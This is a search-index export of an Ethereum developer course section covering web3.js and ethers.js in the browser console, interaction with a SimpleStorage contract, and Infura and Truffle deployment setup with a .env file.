Tooling"},{"location":"S04-developer-tooling/M1-intro/L4-ag-dev-workflow/#additional-materials","text":"Remix Interface The original IDE for Ethereum! Well, probably not the original, but still the best first place to go to start Solidity development. Basic Training: Code Editors, VSCode Extensions I know, I know, you're super sick of hearing about Basic Training. Fair! But you should be sure to install all the VSCode extensions in this section of Basic Training, since it will help with development! Tutorial: Using an .env file to keep your secrets safe Essential reading! Good Extensions to Know About Hardhat-contract-sizer , hardhat-gas-reporter Replit Still exploring this one, but really good potential for troubleshooting code with friends. Not blockchain specific! Testing in the Twenties Really good general advice about testing! How to Setup a Solidity Project","title":"Additional Materials"},{"location":"S04-developer-tooling/M2-web3-libraries/L1-intro-web3-ethers/","text":"Web 3 JavaScript Libraries As we mentioned in \"Where Do Users Fit in Our Mental Model?\" Web 3 JavaScript APIs are critical to connecting users to our blockchain applications. There are a variety of common JavaScript libraries that you can use to connect to Ethereum and develop an interface for your users. Many of the libraries serve the same purpose and have the same functionality, but the syntax differs for each. The purpose of this lesson is to show the similarities and differences between the main two libraries, Web3.js and ethers.js, so you gain a better understanding of what these libraries do a general level and how each one does it. If you are using the Brave browser, you may encounter conflicts with the built-in Ethereum wallet and Metamask. If this happens, try using a different browser with Metamask installed. Truffle Truffle is the framework that we have covered in the most depth so far in the course. Truffle will connect to a running blockchain specified in the truffle-config.js file, manage deployments via migration scripts and information stored in the truffle artifacts and abstracts away much of the complexity of interacting with contracts (via contract abstractions ). Other libraries handle these in different ways and have different APIs that are useful to review. Web3.js Web3.js is one of the most popular JavaScript libraries in Ethereum dApp development. It is currently maintained by Chainsafe, and you can visit the Web3.js repository here. Formerly, Web3.js was the library that Metamask would injected into your browser. If you had Metamask installed in your browser, you could see the web3 object by opening your browser developer tools. Since 2020, MetaMask has deprecated the injection of Web3.js into the browser and now simply uses window.ethereum. Read more here. Since MetaMask does not inject it anymore, let's add it ourselves using the following steps: Open your browser's developer console. See this article for how to do it for major browsers in each major operating system. In the Console, add the following series of Javascript code. Press enter after each line of code: var script = document . createElement ( 'script' ); script . type = 'text/javascript' ; script . src = 'script.js' ; script . src = 'https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js' ; document . head . appendChild ( script ); If this executed successfully, it will give us access to the web3 object. If you enter web3 into the console, you should see some auto-suggestions which means its available. Now, we need to start up a local testnet using Ganache. Connect to Ganache GUI Let's connect to Ganache GUI. Start Ganache GUI and use the gear icon to change the Ganache port to 8545 . connect Metamask to Localhost 8545 Import Ganache Account into MetaMask Note: These keys are not considered safe for production. You should not use them out in the wild! You can easily import Ganache GUI accounts into Metamask by importing via the private key. Click the key icon on the right side of Ganache GUI to get the associated account private key. To import the account into Metamask, select \"Import Account\" in the Metamask accounts dropdown, and paste in the private key. Copy the public address of another address in your Ganache GUI. This is the address we'll send our transaction to! Sending the Transaction We need to connect our web3 object to our MetaMask account. We do that by running the following commands: ethereum.request({ method: 'eth_requestAccounts' }) This should pop-up a MetaMask window asking you to connect to our website, please click \"Confirm\" Now that we have access to MetaMask, we can connect MetaMask to our web3 object by running the following: web3 = new Web3(window.ethereum) Checking the account Once you are connected to Ganache GUI through Metamask, you can send transactions on the Ganache GUI network through the injected web3 object in the browser console. Typing web3.currentProvider.selectedAddress should return your current account address. Sending a Transaction Grab the second public address you copied earlier from your Ganache GUI. Use the following code snippet as your transaction information. var transaction = { from: web3.currentProvider.selectedAddress, to: \"ENTER_SECOND_ADDRESS_HERE\", value: web3.utils.toWei(\"0.001\", \"ether\") } Th \"to\" account is the second account that is generated by the Quickstart in Ganache GUI. Now sending a transaction is as easy as entering ethereum.request({ method: 'eth_sendTransaction', params: [transaction]}) in the console and Metamask will pop up, asking you to sign the transaction. If you get an error, you may need to reset the web3 provider. You can do that with this line of code web3.setProvider(web3.currentProvider) . Nonce Mismatch Errors If you use Metamask accounts on different development blockchains, the nonce counts may get out of sync, in which case you will see an error when trying to execute a transaction. Metamask tracks the account nonce independently so this can get out of sync with the account nonce on the blockchain network that you are trying to interact with. If this happens, it is a simple fix. Open Metamask and click the account icon on the upper right and select \"Settings\". In the \"Advanced\" area, select \"Reset Account\". If you were seeing this error, reset your account and try sending the transaction again. Metamask will get the correct account nonce from the blockchain network. When the transaction succeeds, you should see the new account balances reflected on Ganache GUI. You can check the balance of these accounts with the line let balance = await ethereum.request({ method: 'eth_getBalance', params:[web3.currentProvider.selectedAddress, \"latest\"]}) , this returns the account balance expressed in Wei in hexadecimal format and can be converted to ether like so parseInt(balance) / 10**18 . This is just a quick intro to sending transaction with web3.js v1.0. You can learn more about how to use it via the docs and specifically about how to connect to a contract via this section. Keep in mind that this library is still in development, so if you run into any bugs, please report them! Ethers.js Let's try connecting to a different library, the ethers.js library. We'll have to follow the same steps to import it as above with Web3.js: var script = document . createElement ( 'script' ); script . type = 'text/javascript' ; script . src = 'script.js' ; script . src = 'https://cdn.ethers.io/lib/ethers-5.1.umd.min.js' ; document . head . appendChild ( script ); Connect to the Web 3 provider In the browser console, you can connect ethers.js to the current network by accessing the provider given by Metamask, then set it is as the \"signer\". // A Web3Provider wraps a standard Web3 provider, which is // what Metamask injects as window.ethereum into each page const provider = new ethers.providers.Web3Provider(window.ethereum) const provider = new ethers.providers.Web3Provider(web3.currentProvider); // There is only ever up to one account in MetaMask exposed const signer = provider.getSigner(); Now that Metamask is set as the signer, you can send a transaction. Check the \"signer\" API of ethers.js to see how to send a transaction. Something like \"signer.sendTransaction(transaction)\" should work, but what does a transaction look like in ethers.js? { // Required unless deploying a contract (in which case omit) to: addressOrName, // the target address or ENS name // These are optional/meaningless for call and estimateGas nonce: 0, // the transaction nonce gasLimit: 0, // the maximum gas this transaction may spend gasPrice: 0, // the price (in wei) per unit of gas // These are always optional (but for call, data is usually specified) data: \"0x\", // extra data for the transaction, or input for call value: 0, // the amount (in wei) this transaction is sending chainId: 3 // the network ID; usually added by a signer } You can check the docs here. For a simple ether transfer, you can get away with: var transaction = { to: \"TO_ADDRESS_HERE\", value: ethers.utils.parseEther(\"1\") } And to send it, enter signer.sendTransaction(transaction) in the browser console. Confirm the transaction and verify that the account balances have changed in Ganache GUI. Please explore the Ether.js documentation to see all of the things that it can do. Summary As a developer, you can use different JavaScript libraries to interact with Ethereum blockchains. Many of the JavaScript libraries do many of the same things, but they may handle transaction signers or providers differently or have different ways of connecting to contracts and listening to events. The library you choose is primarily a matter of personal preference. We focus on using web3.js in this course, but introduce ethers.js because it is a popular alternative. Additional Material Article: Web3 vs ethers Part I and Part II by Academy's own Tom Hay and Robbie K. Course: Learn Ethers.js (Chainshot) Use Chainshot's excellent interactive interface to learn more about ethers.js","title":"Web 3 JavaScript Libraries"},{"location":"S04-developer-tooling/M2-web3-libraries/L1-intro-web3-ethers/#web-3-javascript-libraries","text":"As we mentioned in \"Where Do Users Fit in Our Mental Model?\" Web 3 JavaScript APIs are critical to connecting users to our blockchain applications. There are a variety of common JavaScript libraries that you can use to connect to Ethereum and develop an interface for your users. Many of the libraries serve the same purpose and have the same functionality, but the syntax differs for each. The purpose of this lesson is to show the similarities and differences between the main two libraries, Web3.js and ethers.js, so you gain a better understanding of what these libraries do a general level and how each one does it. If you are using the Brave browser, you may encounter conflicts with the built-in Ethereum wallet and Metamask. If this happens, try using a different browser with Metamask installed.","title":"Web 3 JavaScript Libraries"},{"location":"S04-developer-tooling/M2-web3-libraries/L1-intro-web3-ethers/#truffle","text":"Truffle is the framework that we have covered in the most depth so far in the course. Truffle will connect to a running blockchain specified in the truffle-config.js file, manage deployments via migration scripts and information stored in the truffle artifacts and abstracts away much of the complexity of interacting with contracts (via contract abstractions ). Other libraries handle these in different ways and have different APIs that are useful to review.","title":"Truffle"},{"location":"S04-developer-tooling/M2-web3-libraries/L1-intro-web3-ethers/#web3js","text":"Web3.js is one of the most popular JavaScript libraries in Ethereum dApp development. It is currently maintained by Chainsafe, and you can visit the Web3.js repository here. Formerly, Web3.js was the library that Metamask would injected into your browser. If you had Metamask installed in your browser, you could see the web3 object by opening your browser developer tools. Since 2020, MetaMask has deprecated the injection of Web3.js into the browser and now simply uses window.ethereum. Read more here. Since MetaMask does not inject it anymore, let's add it ourselves using the following steps: Open your browser's developer console. See this article for how to do it for major browsers in each major operating system. In the Console, add the following series of Javascript code. Press enter after each line of code: var script = document . createElement ( 'script' ); script . type = 'text/javascript' ; script . src = 'script.js' ; script . src = 'https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js' ; document . head . appendChild ( script ); If this executed successfully, it will give us access to the web3 object. If you enter web3 into the console, you should see some auto-suggestions which means its available. Now, we need to start up a local testnet using Ganache.","title":"Web3.js"},{"location":"S04-developer-tooling/M2-web3-libraries/L1-intro-web3-ethers/#connect-to-ganache-gui","text":"Let's connect to Ganache GUI. Start Ganache GUI and use the gear icon to change the Ganache port to 8545 . connect Metamask to Localhost 8545","title":"Connect to Ganache GUI"},{"location":"S04-developer-tooling/M2-web3-libraries/L1-intro-web3-ethers/#import-ganache-account-into-metamask","text":"Note: These keys are not considered safe for production. You should not use them out in the wild! You can easily import Ganache GUI accounts into Metamask by importing via the private key. Click the key icon on the right side of Ganache GUI to get the associated account private key. To import the account into Metamask, select \"Import Account\" in the Metamask accounts dropdown, and paste in the private key. Copy the public address of another address in your Ganache GUI. This is the address we'll send our transaction to!","title":"Import Ganache Account into MetaMask"},{"location":"S04-developer-tooling/M2-web3-libraries/L1-intro-web3-ethers/#sending-the-transaction","text":"We need to connect our web3 object to our MetaMask account. We do that by running the following commands: ethereum.request({ method: 'eth_requestAccounts' }) This should pop-up a MetaMask window asking you to connect to our website, please click \"Confirm\" Now that we have access to MetaMask, we can connect MetaMask to our web3 object by running the following: web3 = new Web3(window.ethereum)","title":"Sending the Transaction"},{"location":"S04-developer-tooling/M2-web3-libraries/L1-intro-web3-ethers/#checking-the-account","text":"Once you are connected to Ganache GUI through Metamask, you can send transactions on the Ganache GUI network through the injected web3 object in the browser console. Typing web3.currentProvider.selectedAddress should return your current account address.","title":"Checking the account"},{"location":"S04-developer-tooling/M2-web3-libraries/L1-intro-web3-ethers/#_1","text":"","title":""},{"location":"S04-developer-tooling/M2-web3-libraries/L1-intro-web3-ethers/#sending-a-transaction","text":"Grab the second public address you copied earlier from your Ganache GUI. Use the following code snippet as your transaction information. var transaction = { from: web3.currentProvider.selectedAddress, to: \"ENTER_SECOND_ADDRESS_HERE\", value: web3.utils.toWei(\"0.001\", \"ether\") } Th \"to\" account is the second account that is generated by the Quickstart in Ganache GUI. Now sending a transaction is as easy as entering ethereum.request({ method: 'eth_sendTransaction', params: [transaction]}) in the console and Metamask will pop up, asking you to sign the transaction. If you get an error, you may need to reset the web3 provider. You can do that with this line of code web3.setProvider(web3.currentProvider) .","title":"Sending a Transaction"},{"location":"S04-developer-tooling/M2-web3-libraries/L1-intro-web3-ethers/#nonce-mismatch-errors","text":"If you use Metamask accounts on different development blockchains, the nonce counts may get out of sync, in which case you will see an error when trying to execute a transaction. Metamask tracks the account nonce independently so this can get out of sync with the account nonce on the blockchain network that you are trying to interact with. If this happens, it is a simple fix. Open Metamask and click the account icon on the upper right and select \"Settings\". In the \"Advanced\" area, select \"Reset Account\". If you were seeing this error, reset your account and try sending the transaction again. Metamask will get the correct account nonce from the blockchain network. When the transaction succeeds, you should see the new account balances reflected on Ganache GUI. You can check the balance of these accounts with the line let balance = await ethereum.request({ method: 'eth_getBalance', params:[web3.currentProvider.selectedAddress, \"latest\"]}) , this returns the account balance expressed in Wei in hexadecimal format and can be converted to ether like so parseInt(balance) / 10**18 . This is just a quick intro to sending transaction with web3.js v1.0. You can learn more about how to use it via the docs and specifically about how to connect to a contract via this section. Keep in mind that this library is still in development, so if you run into any bugs, please report them!","title":"Nonce Mismatch Errors"},{"location":"S04-developer-tooling/M2-web3-libraries/L1-intro-web3-ethers/#ethersjs","text":"Let's try connecting to a different library, the ethers.js library. We'll have to follow the same steps to import it as above with Web3.js: var script = document . createElement ( 'script' ); script . type = 'text/javascript' ; script . src = 'script.js' ; script . src = 'https://cdn.ethers.io/lib/ethers-5.1.umd.min.js' ; document . head . appendChild ( script );","title":"Ethers.js"},{"location":"S04-developer-tooling/M2-web3-libraries/L1-intro-web3-ethers/#connect-to-the-web-3-provider","text":"In the browser console, you can connect ethers.js to the current network by accessing the provider given by Metamask, then set it is as the \"signer\". // A Web3Provider wraps a standard Web3 provider, which is // what Metamask injects as window.ethereum into each page const provider = new ethers.providers.Web3Provider(window.ethereum) const provider = new ethers.providers.Web3Provider(web3.currentProvider); // There is only ever up to one account in MetaMask exposed const signer = provider.getSigner(); Now that Metamask is set as the signer, you can send a transaction. Check the \"signer\" API of ethers.js to see how to send a transaction. Something like \"signer.sendTransaction(transaction)\" should work, but what does a transaction look like in ethers.js? { // Required unless deploying a contract (in which case omit) to: addressOrName, // the target address or ENS name // These are optional/meaningless for call and estimateGas nonce: 0, // the transaction nonce gasLimit: 0, // the maximum gas this transaction may spend gasPrice: 0, // the price (in wei) per unit of gas // These are always optional (but for call, data is usually specified) data: \"0x\", // extra data for the transaction, or input for call value: 0, // the amount (in wei) this transaction is sending chainId: 3 // the network ID; usually added by a signer } You can check the docs here. For a simple ether transfer, you can get away with: var transaction = { to: \"TO_ADDRESS_HERE\", value: ethers.utils.parseEther(\"1\") } And to send it, enter signer.sendTransaction(transaction) in the browser console. Confirm the transaction and verify that the account balances have changed in Ganache GUI. Please explore the Ether.js documentation to see all of the things that it can do.","title":"Connect to the Web 3 provider"},{"location":"S04-developer-tooling/M2-web3-libraries/L1-intro-web3-ethers/#summary","text":"As a developer, you can use different JavaScript libraries to interact with Ethereum blockchains. Many of the JavaScript libraries do many of the same things, but they may handle transaction signers or providers differently or have different ways of connecting to contracts and listening to events. The library you choose is primarily a matter of personal preference. We focus on using web3.js in this course, but introduce ethers.js because it is a popular alternative.","title":"Summary"},{"location":"S04-developer-tooling/M2-web3-libraries/L1-intro-web3-ethers/#additional-material","text":"Article: Web3 vs ethers Part I and Part II by Academy's own Tom Hay and Robbie K. Course: Learn Ethers.js (Chainshot) Use Chainshot's excellent interactive interface to learn more about ethers.js","title":"Additional Material"},{"location":"S04-developer-tooling/M2-web3-libraries/L2-web3-connect-to-contract/","text":"This lesson is meant to directly follow the previous lesson. If you have not gone through that lesson yet, please go back and do that one first to avoid confusion and potential errors. In this lesson we are going to use web3.js in the browser console again. This time to connect to a SimpleStorage.sol contract that is deployed on the Rinkeby testnet. You can view the code for the contract on GitHub here and on etherscan here . Connect to the network and load Web3.js First, make sure that Metamask is connected to the Rinkeby network. Next, we'll have to add the Web3.js library to this site. Since MetaMask does not inject it anymore, let's add it ourselves using the following steps (from last tutorial, but we need to redo it because we changed pages!): Open your browser's developer console. See this article for how to do it for major browsers in each major operating system. In the Console, add the following series of Javascript code. Press enter after each line of code: var script = document . createElement ( 'script' ); script . type = 'text/javascript' ; script . src = 'script.js' ; script . src = 'https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js' ; document . head . appendChild ( script ); Connect MetaMask Again, we need to connect our web3 object to our MetaMask account. We do that by running the following commands: web3 = new Web3(window.ethereum) Initialize the contract Before we can interact with the contract, we need to initialize an instance of the SimpleStorage contract using web3.js. In this step we are going to provide web3.js with the ABI and the contract address, so it knows what functions are available at the address that we provide. The SimpleStorage.sol contract is deployed at address 0x49Bb098E781eD5C50D85E82d85cbA1a6F03FD3e6. Let's set the address in the console: const SSaddress = \"0x49Bb098E781eD5C50D85E82d85cbA1a6F03FD3e6\" Let's set the ABI in the console with: const ABI = [ { \"constant\": false, \"inputs\": [ { \"internalType\": \"uint256\", \"name\": \"x\", \"type\": \"uint256\" } ], \"name\": \"set\", \"outputs\": [], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"function\" }, { \"anonymous\": false, \"inputs\": [ { \"indexed\": false, \"internalType\": \"uint256\", \"name\": \"newValue\", \"type\": \"uint256\" }, { \"indexed\": false, \"internalType\": \"address\", \"name\": \"updatedBy\", \"type\": \"address\" } ], \"name\": \"storageUpdate\", \"type\": \"event\" }, { \"constant\": true, \"inputs\": [], \"name\": \"get\", \"outputs\": [ { \"internalType\": \"uint256\", \"name\": \"\", \"type\": \"uint256\" } ], \"payable\": false, \"stateMutability\": \"view\", \"type\": \"function\" } ] To create a new contract instance we run const simpleStorage = new web3.eth.Contract(ABI, SSaddress) . We can see that the simpleStorage contract object now has events, methods and an address that we provided with the ABI and contract address. We just need to set the web3 provider for the contract, which we can do with simpleStorage.setProvider(web3.givenProvider) . Now we can use this contract object to interact with the deployed contract. You will need some Rinkeby ETH to pay for gas to interact with the contract. You can get some via this link: https://www.rinkeby.io/#faucet . Read the contract state Let's read the current value of the storedData. Since our contract object is saved as simpleStorage, run simpleStorage.methods.get().call().then(console.log) . This will print the current storedData value of the contract. Since this is just reading the contract, there is no transaction sent to the network and there is no cost associated with this action. Update the contract state We update the contract by sending it a transaction to the \"set()\" function with the desired parameter. This action does cost gas, since we need to update the state of the contract on all of the network nodes. Feel free to update the value to whatever you want. simpleStorage.methods.set(SET_YOUR_NEW_NUMBER_HERE).send({from: web3.givenProvider.selectedAddress}) Running this code should trigger Metamask to ask you to sign a transaction. Once the transaction is mined, you can check for the transaction with simpleStorage.methods.get().call().then(console.log) or you can check the contract on a Rinkeby block explorer like the one here. Watch for events You can easily subscribe to events with simpleStorage. Notice we have a \"storageUpdate\" event in the contract. To listen for that event, run simpleStorage.events.storageUpdate(function(error, event){console.log(event)}) Here is a link to the relevant web3.js documentation for subscribing to events. To trigger this event, you will have to call the \"set()\" function on the contract again. Once the update transaction is mined, the event will fire. This is what it looks like in the browser console. This should give you a good overview of how to connect to a contract and interact with it using web3.js","title":"Index"},{"location":"S04-developer-tooling/M2-web3-libraries/L2-web3-connect-to-contract/#connect-to-the-network-and-load-web3js","text":"First, make sure that Metamask is connected to the Rinkeby network. Next, we'll have to add the Web3.js library to this site. Since MetaMask does not inject it anymore, let's add it ourselves using the following steps (from last tutorial, but we need to redo it because we changed pages!): Open your browser's developer console. See this article for how to do it for major browsers in each major operating system. In the Console, add the following series of Javascript code. Press enter after each line of code: var script = document . createElement ( 'script' ); script . type = 'text/javascript' ; script . src = 'script.js' ; script . src = 'https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js' ; document . head . appendChild ( script );","title":"Connect to the network and load Web3.js"},{"location":"S04-developer-tooling/M2-web3-libraries/L2-web3-connect-to-contract/#connect-metamask","text":"Again, we need to connect our web3 object to our MetaMask account. We do that by running the following commands: web3 = new Web3(window.ethereum)","title":"Connect MetaMask"},{"location":"S04-developer-tooling/M2-web3-libraries/L2-web3-connect-to-contract/#initialize-the-contract","text":"Before we can interact with the contract, we need to initialize an instance of the SimpleStorage contract using web3.js. In this step we are going to provide web3.js with the ABI and the contract address, so it knows what functions are available at the address that we provide. The SimpleStorage.sol contract is deployed at address 0x49Bb098E781eD5C50D85E82d85cbA1a6F03FD3e6. Let's set the address in the console: const SSaddress = \"0x49Bb098E781eD5C50D85E82d85cbA1a6F03FD3e6\" Let's set the ABI in the console with: const ABI = [ { \"constant\": false, \"inputs\": [ { \"internalType\": \"uint256\", \"name\": \"x\", \"type\": \"uint256\" } ], \"name\": \"set\", \"outputs\": [], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"function\" }, { \"anonymous\": false, \"inputs\": [ { \"indexed\": false, \"internalType\": \"uint256\", \"name\": \"newValue\", \"type\": \"uint256\" }, { \"indexed\": false, \"internalType\": \"address\", \"name\": \"updatedBy\", \"type\": \"address\" } ], \"name\": \"storageUpdate\", \"type\": \"event\" }, { \"constant\": true, \"inputs\": [], \"name\": \"get\", \"outputs\": [ { \"internalType\": \"uint256\", \"name\": \"\", \"type\": \"uint256\" } ], \"payable\": false, \"stateMutability\": \"view\", \"type\": \"function\" } ] To create a new contract instance we run const simpleStorage = new web3.eth.Contract(ABI, SSaddress) . We can see that the simpleStorage contract object now has events, methods and an address that we provided with the ABI and contract address. We just need to set the web3 provider for the contract, which we can do with simpleStorage.setProvider(web3.givenProvider) . Now we can use this contract object to interact with the deployed contract. You will need some Rinkeby ETH to pay for gas to interact with the contract. You can get some via this link: https://www.rinkeby.io/#faucet .","title":"Initialize the contract"},{"location":"S04-developer-tooling/M2-web3-libraries/L2-web3-connect-to-contract/#read-the-contract-state","text":"Let's read the current value of the storedData. Since our contract object is saved as simpleStorage, run simpleStorage.methods.get().call().then(console.log) . This will print the current storedData value of the contract. Since this is just reading the contract, there is no transaction sent to the network and there is no cost associated with this action.","title":"Read the contract state"},{"location":"S04-developer-tooling/M2-web3-libraries/L2-web3-connect-to-contract/#update-the-contract-state","text":"We update the contract by sending it a transaction to the \"set()\" function with the desired parameter. This action does cost gas, since we need to update the state of the contract on all of the network nodes. Feel free to update the value to whatever you want. simpleStorage.methods.set(SET_YOUR_NEW_NUMBER_HERE).send({from: web3.givenProvider.selectedAddress}) Running this code should trigger Metamask to ask you to sign a transaction. Once the transaction is mined, you can check for the transaction with simpleStorage.methods.get().call().then(console.log) or you can check the contract on a Rinkeby block explorer like the one here.","title":"Update the contract state"},{"location":"S04-developer-tooling/M2-web3-libraries/L2-web3-connect-to-contract/#watch-for-events","text":"You can easily subscribe to events with simpleStorage. Notice we have a \"storageUpdate\" event in the contract. To listen for that event, run simpleStorage.events.storageUpdate(function(error, event){console.log(event)}) Here is a link to the relevant web3.js documentation for subscribing to events. To trigger this event, you will have to call the \"set()\" function on the contract again. Once the update transaction is mined, the event will fire. This is what it looks like in the browser console. This should give you a good overview of how to connect to a contract and interact with it using web3.js","title":"Watch for events"},{"location":"S04-developer-tooling/M3-infura/L1/","text":"In our section on \"Development Workflow\" and \"Users in the Mental Model,\" we described our interactions with the Ethereum network going through a network gateway. In the \"Ethereum Basics\" of the course, we talked about Ethereum clients, nodes, and how to interact with the network you need to run a full node. However, for developers just starting on Ethereum or users who don't have easy access (or knowledge) of an Ethereum node, you can use an Ethereum gateway service called Infura. Infura provides a simple API access point for not only the Ethereum mainnet and all public testnets, but also for IPFS, the Ethereum 2.0 Beacon Chain, Filecoin, Optimism, Arbitrum and Polygon. Incorporating Infura into your workflow will make deploying much easier. As your project grows, you can absolutely consider other options, but it's a nice, easy onramp to development. Follow the steps below to sign up for Infura (there are also great step-by-step instructions on Infura's website here ): Register First thing, register for a free account on Infura. For smaller development projects (or even medium-sized ones), Infura's free tier is more than capable of handling your requests. Coogan is currently running an Eth2 validator client on Infura's free tier (you'll see it in the screenshots below!) Setting Up Your First Project Once you've registered, you'll click the Ethereum logo on the left-hand side. (see below) You can also see the other available network endpoints listed here, which will be more since we took the above screenshot! Next, click \u201cCreate New Project\u201d in upper right hand corner: Name your project and go to \u201cSettings.\u201d There, you'll be able to access the credentials you'll use in your local environment (either Truffle or some other framework) to help make deployment easy. Again, these are your personal, sensitive credentials so be sure to store them in a .env file that you add to your .gitignore doc! Read more about that here. A .env file for our Infura credentials will look something like: MNEMONIC=\"Your MNEMONICs\" // A wallet with enough ETH INFURA_URL=\"Your Infura URL with API key\" source Incorporating Infura Into Your Development Environment Now let's see how we take our Infura credentials and plug them into a development framework like Truffle. For this, we're going to dive deeper into our truffle-config.js file As you might have gathered by now, the Truffle configuration file ( truffle-config.js ) is the backbone of a Truffle-based project. Thus far we\u2019ve only seen it used to store details of the different networks we\u2019re targeting (e.g. local, testnet, mainet, etc), but it\u2019s actually used for a lot more, such as network configuration. To illustrate this, let's look at the networks section of our truffle-config.js from our SimpleStorage example we've been working on in previous lessons. Here's a sample truffle-config.js file that targets the Ganache endpoint we setup earlier: module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" // Match any network id } }, compilers : { solc : { version : \"^0.8.0\" } } }; When we run truffle init earlier, though, the truffle-config.js contains a ton of helpful material that's been commented out. For example, here's a section under networks : // Useful for deploying to a public network. // NB: It's important to wrap the provider as a function. // ropsten: { // provider: () => new HDWalletProvider(mnemonic, `https://ropsten.infura.io/v3/YOUR-PROJECT-ID`), // network_id: 3, // Ropsten's id // gas: 5500000, // Ropsten has a lower block limit than mainnet // confirmations: 2, // # of confs to wait between deployments. (default: 0) // timeoutBlocks: 200, // # of blocks before a deployment times out (minimum/default: 50) // skipDryRun: true // Skip dry run before migrations? (default: false for public nets ) // }, To activate this, all we have to do is comment the code back in ( \u2318 / in VSCode) and substitute in the credentials we got from Infura. Note that you need to change the YOUR-PROJECT-ID and well as whatever subdomain network you'd like to work from. Be sure as well to change the network_id to the appropriate one for your network. Install hdwallet-provider npm install @truffle/hdwallet-provider and dotenv to handle our .env file npm install dotenv To grab our Infura credentials safely from our .env file, you'll include this at the top of truffle-config.js (HDWallet is provided, we just need to comment it out): const HDWalletProvider = require ( '@truffle/hdwallet-provider' ); const dotenv = require ( 'dotenv' ); dotenv . config (); const mnemonic = process . env . MNEMONIC ; (For reference, in the above snippet we're also using Truffle\u2019s HDWalletProvider library enabling us to use a custom mnemonic as part of the deployment.) We can change the name of our testnet to any one we'd like. Here's what it would look like for Rinkeby: rinkeby : { provider : () => new HDWalletProvider ( mnemonic , process . env . INFURA_URL ), network_id : \"4\" , gas : 5500000 } To migrate SimpleStorage to Rinkeby, we run the following command: $ truffle migrate --network rinkeby That's it! If you have enough Rinkeby test Eth in the account associated with your mnemonic phrase, your contract is now deployed to a public testnet using Infura! Later in the course, we'll discuss how Truffle and Infura can be used in the truffle-config.js file to deploy to multiple networks, including non-Ethereum networks.","title":"Index"},{"location":"S04-developer-tooling/M3-infura/L1/#register","text":"First thing, register for a free account on Infura. For smaller development projects (or even medium-sized ones), Infura's free tier is more than capable of handling your requests. Coogan is currently running an Eth2 validator client on Infura's free tier (you'll see it in the screenshots below!)","title":"Register"},{"location":"S04-developer-tooling/M3-infura/L1/#setting-up-your-first-project","text":"Once you've registered, you'll click the Ethereum logo on the left-hand side. (see below) You can also see the other available network endpoints listed here, which will be more since we took the above screenshot! Next, click \u201cCreate New Project\u201d in upper right hand corner: Name your project and go to \u201cSettings.\u201d There, you'll be able to access the credentials you'll use in your local environment (either Truffle or some other framework) to help make deployment easy. Again, these are your personal, sensitive credentials so be sure to store them in a .env file that you add to your .gitignore doc! Read more about that here. A .env file for our Infura credentials will look something like: MNEMONIC=\"Your MNEMONICs\" // A wallet with enough ETH INFURA_URL=\"Your Infura URL with API key\" source","title":"Setting Up Your First Project"},{"location":"S04-developer-tooling/M3-infura/L1/#incorporating-infura-into-your-development-environment","text":"Now let's see how we take our Infura credentials and plug them into a development framework like Truffle. For this, we're going to dive deeper into our truffle-config.js file As you might have gathered by now, the Truffle configuration file ( truffle-config.js ) is the backbone of a Truffle-based project. Thus far we\u2019ve only seen it used to store details of the different networks we\u2019re targeting (e.g. local, testnet, mainet, etc), but it\u2019s actually used for a lot more, such as network configuration. To illustrate this, let's look at the networks section of our truffle-config.js from our SimpleStorage example we've been working on in previous lessons. Here's a sample truffle-config.js file that targets the Ganache endpoint we setup earlier: module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" // Match any network id } }, compilers : { solc : { version : \"^0.8.0\" } } }; When we run truffle init earlier, though, the truffle-config.js contains a ton of helpful material that's been commented out. For example, here's a section under networks : // Useful for deploying to a public network. // NB: It's important to wrap the provider as a function. // ropsten: { // provider: () => new HDWalletProvider(mnemonic, `https://ropsten.infura.io/v3/YOUR-PROJECT-ID`), // network_id: 3, // Ropsten's id // gas: 5500000, // Ropsten has a lower block limit than mainnet // confirmations: 2, // # of confs to wait between deployments. (default: 0) // timeoutBlocks: 200, // # of blocks before a deployment times out (minimum/default: 50) // skipDryRun: true // Skip dry run before migrations? (default: false for public nets ) // }, To activate this, all we have to do is comment the code back in ( \u2318 / in VSCode) and substitute in the credentials we got from Infura. Note that you need to change the YOUR-PROJECT-ID and well as whatever subdomain network you'd like to work from. Be sure as well to change the network_id to the appropriate one for your network. Install hdwallet-provider npm install @truffle/hdwallet-provider and dotenv to handle our .env file npm install dotenv To grab our Infura credentials safely from our .env file, you'll include this at the top of truffle-config.js (HDWallet is provided, we just need to comment it out): const HDWalletProvider = require ( '@truffle/hdwallet-provider' ); const dotenv = require ( 'dotenv' ); dotenv . config (); const mnemonic = process . env . MNEMONIC ; (For reference, in the above snippet we're also using Truffle\u2019s HDWalletProvider library enabling us to use a custom mnemonic as part of the deployment.) We can change the name of our testnet to any one we'd like. Here's what it would look like for Rinkeby: rinkeby : { provider : () => new HDWalletProvider ( mnemonic , process . env . INFURA_URL ), network_id : \"4\" , gas : 5500000 } To migrate SimpleStorage to Rinkeby, we run the following command: $ truffle migrate --network rinkeby That's it! If you have enough Rinkeby test Eth in the account associated with your mnemonic phrase, your contract is now deployed to a public testnet using Infura! Later in the course, we'll discuss how Truffle and Infura can be used in the truffle-config.js file to deploy to multiple networks, including non-Ethereum networks.","title":"Incorporating Infura Into Your Development Environment"},{"location":"S04-developer-tooling/M3-infura/L2/","text":"Using Infura to Access Ethereum Archive Data (Tutorial) This is a full-stack application that provides a reference implementation and proof-of-concept for various use cases that are enabled by access to Ethereum archive data. Check out the repo here: https://github.com/anataliocs/Archive-Data-Playground Technologies Used: Java 11 Spring Boot Gradle Typescript React/Redux node/npm Setup and Configuration The project is built with a Java/Spring Boot backend and a React front-end. You will need to install the following dependencies locally to run this project: An Infura account Git Node / npm Java 11 An IDE Get your API endpoint URL and Project ID Head to https://infura.io/ and go to your project settings page: Now let\u2019s set up our externalized configuration so that we can use our project ID without exposing those details on Github. The Spring Boot app uses Spring Dev Tools when running locally so we can use a .spring-boot-devtools.properties file for configuration properties. Configuration for MacOS users: Create the properties file: touch ~/.spring-boot-devtools.properties Open the properties file: vi ~/.spring-boot-devtools.properties Add the following line to properties file: infura.projectid=[YOUR_PROJECT_ID] Running the application: Pull down the source code: 